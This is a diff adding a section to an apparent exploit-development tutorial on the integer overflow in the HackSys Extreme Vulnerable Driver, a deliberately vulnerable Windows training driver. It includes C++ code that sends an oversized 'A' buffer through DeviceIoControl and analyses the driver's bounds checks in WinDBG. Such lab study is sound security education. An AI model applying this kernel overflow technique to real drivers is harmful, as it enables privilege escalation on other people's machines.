@@ -80,4 +80,88 @@ As long as:
 
 we will copy 4 bytes of our input buffer into the kernel buffer and then move onto the next 4 bytes in the input buffer to test criteria 2 and 3 again. 
 
+There can't really be a problem with copying bytes from the user buffer into the kernel buffer unless somehow the copying exceeds the space allocated in the kernel buffer. If that occurs, we'll begin overwriting adjacent memory with our user buffer. How can we fool this length + `0x4` check?
+
+## Manipulating `DWORD nInBufferSize`
+First we'll send a vanilla payload to test our theories up to this point. Let's start by sending a buffer full of all `\x41` chars and it will be a length of `0x751` (null-terminated). We'll use the `sizeof()` method to form our `nInBufferSize` parameter as well so that everything is accurate and consistent. Our code will look like this at this point:
+```cpp
+#include <iostream>
+#include <string>
+#include <iomanip>
+
+#include <Windows.h>
+
+using namespace std;
+
+#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL               0x222027
+
+HANDLE get_handle() {
+
+    HANDLE hFile = CreateFileA(DEVICE_NAME,
+        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        cout << "[!] No handle to HackSysExtremeVulnerableDriver.\n";
+        exit(1);
+    }
+
+    cout << "[>] Handle to HackSysExtremeVulnerableDriver: " << hex << hFile
+        << "\n";
+
+    return hFile;
+}
+
+void send_payload(HANDLE hFile) {
+
+    
+
+    BYTE input_buff[0x751] = { 0 };
+
+    // 'A' * 1871
+    memset(
+        input_buff,
+        '\x41',
+        0x750);
+
+    cout << "[>] Sending buffer of size: " << sizeof(input_buff) << "\n";
+
+    DWORD bytes_ret = 0x0;
+
+    int result = DeviceIoControl(hFile,
+        IOCTL,
+        &input_buff,
+        sizeof(input_buff),
+        NULL,
+        0,
+        &bytes_ret,
+        NULL);
+
+    if (!result) {
+        cout << "[!] Payload failed.\n";
+    }
+}
+
+int main()
+{
+    HANDLE hFile = get_handle();
+
+    send_payload(hFile);
+}
+```
+
+What are our predictions for this code? What conditions will we hit? The criteria for copying bytes from user buffer to kernel buffer was: 
+1. the length of our buffer + 4 is `< 0x800`,
+2. the `Counter` variable (`edi`) is `<` the length of our buffer divided by 4, 
+3. and the 4 byte value in `eax` is not `0BAD0B0B0`
+
+We should pass the first check since our buffer is indeed small enough. This second check will eventually make us exit the function since our length divided by 4, will eventually be caught by the `Counter` as it increments every 4 byte copy. We don't have to worry about the third check as we don't have this string in our payload. Let's send it and step through it in WinDBG. 
+
+![](/assets/images/AWE/intover1.PNG)
+
 ## Conclusion
